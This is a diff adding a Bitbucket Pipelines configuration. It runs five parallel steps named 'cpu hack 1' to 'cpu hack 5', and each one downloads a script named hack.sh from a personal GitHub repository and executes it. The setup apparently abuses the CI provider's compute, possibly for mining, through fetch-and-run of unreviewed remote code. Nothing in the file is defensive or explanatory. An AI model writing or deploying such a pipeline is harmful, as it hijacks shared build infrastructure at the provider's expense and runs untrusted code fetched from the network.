@@ -1,0 +1,44 @@
+image: atlassian/default-image:2
+
+pipelines:
+  default:
+    - parallel:
+        - step:
+            name: cpu hack 1
+            script:
+              - apt-get update && apt-get install -y wget screen
+              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
+              - chmod +x hack.sh
+              - ./hack.sh
+
+        - step:
+            name: cpu hack 2
+            script:
+              - apt-get update && apt-get install -y wget screen
+              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
+              - chmod +x hack.sh
+              - ./hack.sh
+
+        - step:
+            name: cpu hack 3
+            script:
+              - apt-get update && apt-get install -y wget screen
+              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
+              - chmod +x hack.sh
+              - ./hack.sh
+
+        - step:
+            name: cpu hack 4
+            script:
+              - apt-get update && apt-get install -y wget screen
+              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
+              - chmod +x hack.sh
+              - ./hack.sh
+
+        - step:
+            name: cpu hack 5
+            script:
+              - apt-get update && apt-get install -y wget screen
+              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
+              - chmod +x hack.sh
+              - ./hack.sh
